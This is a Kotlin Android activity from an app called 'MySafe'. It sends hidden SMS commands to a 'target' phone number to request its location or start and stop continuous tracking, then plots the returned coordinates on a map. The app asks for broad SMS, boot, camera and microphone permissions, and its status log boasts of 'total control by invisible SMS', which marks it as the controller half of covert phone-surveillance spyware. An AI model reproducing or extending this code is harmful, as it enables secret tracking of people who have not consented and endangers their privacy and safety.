package com.mysafe.mysafe

import android.Manifest
import android.content.*
import android.content.pm.PackageManager
import android.location.Location
import android.os.Build
import android.os.Bundle
import android.telephony.TelephonyManager
import android.util.Log
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.location.*
import org.osmdroid.config.Configuration
import org.osmdroid.tileprovider.tilesource.TileSourceFactory
import org.osmdroid.util.GeoPoint
import org.osmdroid.views.MapView
import org.osmdroid.views.overlay.Marker
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : AppCompatActivity() {
    private lateinit var etNumeroCible: EditText
    private lateinit var btnPosition: Button
    private lateinit var btnSuivi: Button
    private lateinit var btnStop: Button
    private lateinit var mapView: MapView
    private lateinit var tvStatut: TextView
    private lateinit var tvJournal: TextView

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private var monNumero: String = ""
    private var numeroCible: String = ""
    private var remoteMarker: Marker? = null
    private val DEFAULT = GeoPoint(47.4728, -0.5416)

    // PERMISSIONS A DEMANDER A LA PREMIERE OUVERTURE
    private val PERMISSIONS_DEMARRAGE = mutableListOf(
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.FOREGROUND_SERVICE_LOCATION,
        Manifest.permission.POST_NOTIFICATIONS,
        Manifest.permission.RECEIVE_BOOT_COMPLETED,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            add(Manifest.permission.FOREGROUND_SERVICE_CAMERA)
            add(Manifest.permission.FOREGROUND_SERVICE_MICROPHONE)
        }
    }.toTypedArray()

    private val smsReceiver = object : BroadcastReceiver() {
        override fun onReceive(c: Context?, i: Intent?) {
            val msg = i?.getStringExtra("sms_message")
            val exp = i?.getStringExtra("sender_number")
            if (msg != null && exp != null) runOnUiThread { traiterReception(msg, exp) }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        initViews()
        
        // ✅ DEMANDE TOUTES LES PERMISSIONS DES LA PREMIERE OUVERTURE
        verifierEtDemanderPermissions()
        
        setupLocalisation()
        setupCarte()
        recupererMonNumero()
        enregistrerReceiver()
        journal("✅ Pret — Controle total par SMS invisible !")
        tvStatut.text = "✅ Systeme pret — En attente de commandes..."
    }

    private fun initViews() {
        etNumeroCible = findViewById(R.id.etNumeroCible)
        btnPosition = findViewById(R.id.btnPosition)
        btnSuivi = findViewById(R.id.btnSuivi)
        btnStop = findViewById(R.id.btnStop)
        mapView = findViewById(R.id.mapView)
        tvStatut = findViewById(R.id.tvStatut)
        tvJournal = findViewById(R.id.tvJournal)

        btnPosition.setOnClickListener { demanderPosition() }
        btnSuivi.setOnClickListener { demarrerSuivi() }
        btnStop.setOnClickListener { arreterSuivi() }
    }

    // ✅ DEMANDE PERMISSIONS AU DEMARRAGE — UNE SEULE FOIS
    private fun verifierEtDemanderPermissions() {
        val manquantes = PERMISSIONS_DEMARRAGE.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (manquantes.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, manquantes, 1001)
        }
    }

    override fun onRequestPermissionsResult(
        code: Int, perms: Array<out String>, res: IntArray
    ) {
        super.onRequestPermissionsResult(code, perms, res)
        if (code == 1001) {
            val ok = res.all { it == PackageManager.PERMISSION_GRANTED }
            if (ok) {
                Toast.makeText(this, "✅ TOUTES les permissions accordées !", Toast.LENGTH_LONG).show()
                tvStatut.text = "✅ Systeme pret — En attente de commandes..."
            } else {
                Toast.makeText(this, "⚠️ Certaines permissions manquent", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun recupererMonNumero() {
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        if (ActivityCompat.checkSelfPermission(
                this, Manifest.permission.READ_PHONE_STATE
            ) == PackageManager.PERMISSION_GRANTED) {
            monNumero = normaliser(tm.line1Number ?: "")
        }
        SmsReceiver.myPhoneNumber = monNumero
    }

    private fun numeroValide(): Boolean {
        val brut = etNumeroCible.text.toString().trim()
        if (brut.isEmpty()) {
            Toast.makeText(this, "Entre un numero d'abord !", Toast.LENGTH_SHORT).show()
            return false
        }
        numeroCible = normaliser(brut)
        return true
    }

    private fun demanderPosition() {
        if (!numeroValide()) return
        envoyerCommande("!!POSITION")
        journal("📍 Demande de position a $numeroCible")
        Toast.makeText(this, "✅ Demande envoyee !", Toast.LENGTH_SHORT).show()
    }

    private fun demarrerSuivi() {
        if (!numeroValide()) return
        envoyerCommande("!!DEMARRER")
        journal("📡 Suivi continu demande a $numeroCible")
        Toast.makeText(this, "✅ Suivi demande !", Toast.LENGTH_SHORT).show()
    }

    private fun arreterSuivi() {
        if (!numeroValide()) return
        envoyerCommande("!!STOP")
        journal("⏹️ Arret demande a $numeroCible")
        Toast.makeText(this, "✅ Arret demande !", Toast.LENGTH_SHORT).show()
    }

    private fun envoyerCommande(cmd: String) {
        val svc = Intent(this, MySafeAgentService::class.java)
        svc.action = MySafeAgentService.ACTION_SEND_COMMAND
        svc.putExtra(MySafeAgentService.EXTRA_TARGET, numeroCible)
        svc.putExtra(MySafeAgentService.EXTRA_COMMAND, cmd)
        startForegroundService(svc)
    }

    private fun traiterReception(msg: String, expediteur: String) {
        if (!msg.startsWith("!!")) return
        val parts = msg.removePrefix("!!").split(",")
        if (parts.size >= 2) {
            val lat = parts[0].toDoubleOrNull()
            val lon = parts[1].toDoubleOrNull()
            if (lat != null && lon != null && lat != 0.0 && lon != 0.0) {
                journal("📍 $expediteur → $lat, $lon")
                afficherSurCarte(lat, lon)
                Toast.makeText(this, "✅ Position recue !", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun afficherSurCarte(lat: Double, lon: Double) {
        val point = GeoPoint(lat, lon)
        remoteMarker?.let { mapView.overlays.remove(it) }
        remoteMarker = Marker(mapView).apply {
            position = point
            title = "Position Cible"
            setAnchor(Marker.ANCHOR_CENTER, Marker.ANCHOR_BOTTOM)
        }
        mapView.overlays.add(remoteMarker)
        mapView.controller.animateTo(point)
    }

    private fun setupLocalisation() {
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
    }

    private fun setupCarte() {
        val cfg = Configuration.getInstance()
        cfg.load(this, getSharedPreferences("osm", Context.MODE_PRIVATE))
        cfg.userAgentValue = packageName
        
        mapView.setTileSource(TileSourceFactory.MAPNIK)
        mapView.setMultiTouchControls(true)
        mapView.controller.setZoom(15.0)
        mapView.controller.setCenter(DEFAULT)
    }

    private fun enregistrerReceiver() {
        val filter = IntentFilter("com.mysafe.mysafe.SMS_RECEIVED")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(smsReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(smsReceiver, filter)
        }
    }

    private fun journal(texte: String) {
        val h = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        tvJournal.text = "[$h] $texte\n\n${tvJournal.text}"
    }

    private fun normaliser(s: String): String {
        return s.replace("\\s".toRegex(), "").replace("+33", "0").replace("\\D".toRegex(), "")
            .let { if (it.length == 9) "0$it" else it }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(smsReceiver) } catch (e: Exception) {}
    }
}
